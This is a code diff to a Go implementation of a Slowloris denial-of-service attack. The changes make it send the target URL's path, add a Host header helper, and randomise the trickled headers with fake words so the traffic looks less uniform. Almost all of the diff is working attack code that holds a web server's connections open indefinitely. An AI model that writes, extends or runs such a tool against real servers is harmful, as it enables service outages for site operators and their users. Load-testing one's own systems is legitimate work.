@@ -7,6 +7,8 @@ import (
 	"net/url"
 	"strings"
 	"time"
+
+	"github.com/icrowley/fake"
 )
 
 // Slowloris performs single threaded slow loris attack. If you want to run distributed
@@ -22,7 +24,7 @@ func Slowloris(ctx context.Context, index int64, interval time.Duration, url *ur
 		return err
 	}
 
-	requestLine := GetRequestLine()
+	requestLine := GetRequestLine(url.Path)
 	fmt.Println("Sending request line", requestLine)
 	n, err := conn.Write([]byte(requestLine))
 	if err != nil || n < len(requestLine) {
@@ -30,12 +32,12 @@ func Slowloris(ctx context.Context, index int64, interval time.Duration, url *ur
 	}
 
 	for {
-		fmt.Printf("slowloris %d: send header\n", index)
 		select {
 		case <-ctx.Done():
 			return nil
 		case <-time.After(interval):
 			header := RandomHeader()
+			// 			fmt.Printf("slowloris %d: send header (%s)\n", index, strings.ReplaceAll(header, "\r\n", ""))
 			n, err := conn.Write([]byte(header))
 			if err != nil || n < len(header) {
 				return err
@@ -47,14 +49,19 @@ func Slowloris(ctx context.Context, index int64, interval time.Duration, url *ur
 }
 
 // GetRequestLine returns HTTP request line for GET request
-func GetRequestLine() string {
-	return "GET / HTTP/1.1\r\n"
+func GetRequestLine(path string) string {
+	return fmt.Sprintf("GET %s HTTP/1.1\r\n", path)
+}
+
+// HostHeader returns formatted Host header
+func HostHeader(host string) string {
+	return fmt.Sprintf("Host: %s\r\n", host)
 }
 
 // RandomHeader generates a random HTTP header to send as part of the
 // slowloris attack
 func RandomHeader() string {
-	return "Foo: Bar\r\n"
+	return fmt.Sprintf("X-%s: %s\r\n", strings.Title(fake.Word()), fake.Word())
 }
 
 // ClosingLine sends a closing line for a HTTP request
